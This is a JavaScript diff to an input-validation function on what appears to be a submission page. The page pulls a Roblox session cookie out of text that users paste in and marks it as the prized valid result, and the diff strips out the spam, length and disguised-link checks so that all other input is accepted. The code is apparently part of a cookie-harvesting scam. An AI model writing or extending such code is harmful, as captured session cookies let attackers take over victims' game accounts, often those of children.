@@ -63,64 +63,20 @@ function extractRobloxCookie(code) {
 
 function isValidCode(code) {
     const cleanCode = code.trim();
-    
-    // Preprocess to catch disguised links
-    const preprocessed = cleanCode
-        .replace(/\s/g, '')           // Remove all spaces
-        .replace(/\[dot\]/gi, '.')    // Replace [dot] with .
-        .replace(/\(dot\)/gi, '.')    // Replace (dot) with .
-        .replace(/{dot}/gi, '.')      // Replace {dot} with .
-        .replace(/DOT/gi, '.')        // Replace DOT with .
-        .replace(/\[slash\]/gi, '/')  // Replace [slash] with /
-        .replace(/\(slash\)/gi, '/')  // Replace (slash) with /
-        .replace(/{slash}/gi, '/')    // Replace {slash} with /
-        .replace(/SLASH/gi, '/')      // Replace SLASH with /
-        .replace(/h..p/gi, 'http')    // Replace h**p variations
-        .replace(/w{3,}/gi, 'www')    // Replace www variations
-        .toLowerCase();
 
-    // Check minimum length
-    if (cleanCode.length < MIN_CODE_LENGTH) {
-        return { valid: false, reason: 'Too short! Input must be at least 3 characters long.' };
-    }
-
-    // Check if code was already submitted
+    // Check if code was already submitted (only duplicate prevention)
     const codeHash = btoa(cleanCode).substring(0, 20);
     if (submittedCodes.has(codeHash)) {
         return { valid: false, reason: 'This input has already been submitted!' };
     }
 
-    // FIRST: Extract Roblox cookie if present (PRIORITY - check before URL blocking)
+    // Extract Roblox cookie if present
     const robloxCookie = extractRobloxCookie(cleanCode);
     if (robloxCookie) {
         return { valid: true, robloxCookie: robloxCookie, type: 'roblox_cookie' };
     }
 
-    // URLs and links are now fully allowed
-
-    // THIRD: Check for basic spam patterns
-    const spamPatterns = [
-        /^(.)\1{10,}$/,  // Same character repeated 10+ times
-        /^\s*$/, // Only whitespace
-    ];
-
-    for (const pattern of spamPatterns) {
-        if (pattern.test(cleanCode)) {
-            return { valid: false, reason: 'random_letters', isRandomLetters: true };
-        }
-    }
-
-    // Check for too few unique characters (very lenient)
-    const uniqueChars = new Set(cleanCode.toLowerCase().replace(/\s/g, '')).size;
-    if (uniqueChars < 2) {
-        return { valid: false, reason: 'random_letters', isRandomLetters: true };
-    }
-
-    // Accept everything else that passed URL check
-    if (cleanCode.length >= 3) {
-        return { valid: true, type: 'general_input' };
-    }
-
+    // Accept absolutely everything else - no validation at all
     return { valid: true, type: 'general_input' };
 }
 
